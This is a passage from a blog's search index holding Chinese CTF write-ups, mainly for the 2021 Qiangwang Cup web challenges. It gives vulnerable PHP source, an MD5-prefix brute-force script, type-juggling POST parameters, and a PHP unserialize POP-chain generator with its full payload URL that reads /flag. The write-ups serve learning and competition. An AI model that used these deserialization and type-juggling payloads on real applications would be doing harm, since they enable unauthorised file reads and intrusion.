class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>PS：有些小伙伴可能就会问了，用来逃逸的值或者键为啥要用’flagphp‘或者是6个’flag’呢？其实，用什么内容进行逃逸并不重要，重要的是逃逸的内容必须满足一定的长度才可以使得它逃逸之后的序列化字符串是正确的。比如6个’flag’就可以替换为8个’php’!</p><h3 id="忘记说了，源码提示在phpinfo-有提示d0g3-f1ag-php！"><a href="#忘记说了，源码提示在phpinfo-有提示d0g3-f1ag-php！" class="headerlink" title="忘记说了，源码提示在phpinfo()有提示d0g3_f1ag.php！"></a>忘记说了，源码提示在phpinfo()有提示d0g3_f1ag.php！</h3>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 强网杯</title>
      <link href="/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
      <url>/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="强网先锋-寻宝"><a href="#强网先锋-寻宝" class="headerlink" title="[强网先锋]寻宝"></a>[强网先锋]寻宝</h2><p><strong>考点：1. php源码审计         2. 脚本的编写</strong></p><p>给了我们两个信息，分边对应2个KEY，得到2个KEY后就可以获得flag了</p><p>首先我们先看KEY1</p><h3 id="KEY1"><a href="#KEY1" class="headerlink" title="KEY1"></a>KEY1</h3><p>需要绕过5个if就可以获得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word </span>= <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$num1 = $ppp[&#x27;number1&#x27;];</span></span><br><span class="line"><span class="variable">$num1 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);</span><br><span class="line">var_dump(<span class="variable">$ppp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;非数字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1 </span>&gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;第一层&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2 </span>+ <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;第二层&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;第三层&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4 </span>&lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4 </span>== <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4 </span>&lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;第四层&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y </span>= <span class="variable">$b </span>=== <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y </span>=== <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;第五层&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第2个和第4个用科学计数法就可以</p><p>第1个和第5个使用弱类型就可以</p><p>第3个md5碰撞脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0</span></span><br><span class="line">md5_value = <span class="string">&quot;4bf21cd&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    md5_val = hashlib.md5(<span class="built_in">str</span>(payload).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">if</span> md5_val[:<span class="number">7</span>] == md5_value:</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">    payload += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><blockquote><p>ppp[number1]=1234a&amp;ppp[number2]=9e9&amp;ppp[number3]=61823470&amp;ppp[number4]=0e99999&amp;ppp[number5]=1a</p></blockquote><h3 id="KEY2"><a href="#KEY2" class="headerlink" title="KEY2"></a>KEY2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> docx</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;D:/phpstudy_pro/WWW/five_month&#x27;</span>)</span><br><span class="line">dires = os.listdir()</span><br><span class="line"><span class="keyword">for</span> dirss <span class="keyword">in</span> dires:</span><br><span class="line">    os.chdir(<span class="string">f&#x27;D:/phpstudy_pro/WWW/five_month/<span class="subst">&#123;dirss&#125;</span>&#x27;</span>)</span><br><span class="line">    dirs = os.listdir()</span><br><span class="line">    <span class="keyword">for</span> di <span class="keyword">in</span> dirs:</span><br><span class="line">        os.chdir(<span class="string">f&#x27;D:/phpstudy_pro/WWW/five_month/<span class="subst">&#123;dirss&#125;</span>/<span class="subst">&#123;di&#125;</span>&#x27;</span>)</span><br><span class="line">        ds = os.listdir()</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> ds:</span><br><span class="line">            doc = docx.Document(d)</span><br><span class="line">            <span class="keyword">for</span> do <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;KEY2&quot;</span> <span class="keyword">in</span> do.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;five_month/<span class="subst">&#123;dirss&#125;</span>/<span class="subst">&#123;di&#125;</span>/<span class="subst">&#123;d&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(do.text)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/202112062019558.png" alt="image-20210615135023570"></p><p>PS:我写的这个脚本绕过.png图片，所以先用everything把图片提取出去在运行脚本就可以了，记得改路径！</p><h2 id="强网先锋-赌徒"><a href="#强网先锋-赌徒" class="headerlink" title="[强网先锋]赌徒"></a>[强网先锋]赌徒</h2><p><strong>考点： 构造pop链</strong></p><p>进去就一句话</p><blockquote><p>I think you need /etc/hint . Before this you need to see the source code</p></blockquote><p>看了看源码，看了看请求和响应，啥也没看出来</p><p>老规矩，上dirsearch</p><p><img src="/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/202112062019312.png" alt="image-20210614183247758"></p><p>一个<a href="http://www.zip的备份文件，下载下来后里面有一个index.php的源码文件，源码如下：">www.zip的备份文件，下载下来后里面有一个index.php的源码文件，源码如下：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从代码中很容易的可以看出，给’hello’传参，然后进行序列化攻击。</p><p>现在问题来了，代码中一共有3个类，我们需要从哪一个类开始下手呢？</p><p>通过对魔法方法和序列化的的学习，我们只能从Start这个类开始下手，当对这个该类进行反序列化时，会自动执行wakeup()方法，而这3个类中只有Start类存在这个方法</p><p>再继续观察发现，我们最终需要达到的目的地是Room类的Get_hint()方法</p><p>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Start();<span class="comment">// __wakeup()进入，</span></span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> Info();<span class="comment">// Info的__toString()进入</span></span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&quot;filename&quot;</span>] = <span class="keyword">new</span> Room();<span class="comment">// Room的__get()进入</span></span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&quot;filename&quot;</span>]-&gt;a= <span class="keyword">new</span> Room();<span class="comment">// Room的__invoke()进入</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/202112082108006.png" alt="image-20210614193035543"></p><blockquote><p><a href="http://eci-2zechgvn691am5t4itp6.cloudeci1.ichunqiu.com/?hello=O:5:&quot;Start&quot;:2:%7Bs:4:&quot;name&quot;;O:4:&quot;Info&quot;:3:%7Bs:17:&quot;%00Info%00phonenumber&quot;;i:123123;s:7:&quot;promise&quot;;s:15:&quot;I">http://eci-2zechgvn691am5t4itp6.cloudeci1.ichunqiu.com/?hello=O:5:&quot;Start&quot;:2:{s:4:&quot;name&quot;;O:4:&quot;Info&quot;:3:{s:17:&quot;%00Info%00phonenumber&quot;;i:123123;s:7:&quot;promise&quot;;s:15:&quot;I</a> will not !!!!”;s:4:”file”;a:1:{s:8:”filename”;O:4:”Room”:3:{s:8:”filename”;s:5:”/flag”;s:10:”sth_to_set”;N;s:1:”a”;O:4:”Room”:3:{s:8:”filename”;s:5:”/flag”;s:10:”sth_to_set”;N;s:1:”a”;s:0:””;}}}}s:4:”flag”;s:33:”syst3m(“cat 127.0.0.1/etc/hint”);”;}</p></blockquote><p>PS：利用了魔法方法的特性成功进行了序列化攻击，实现了在一个类跳转到另一个类并执行方法！</p><p><img src="/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/202112062019306.png" alt="QQ图片20210614194249"></p><p>base64解密得：</p><p><img src="/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/202112062019628.png" alt="image-20210614194412336"></p><blockquote><p>flag{668c5887-b4ae-4853-a3b4-e50e9c9e1b3e}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
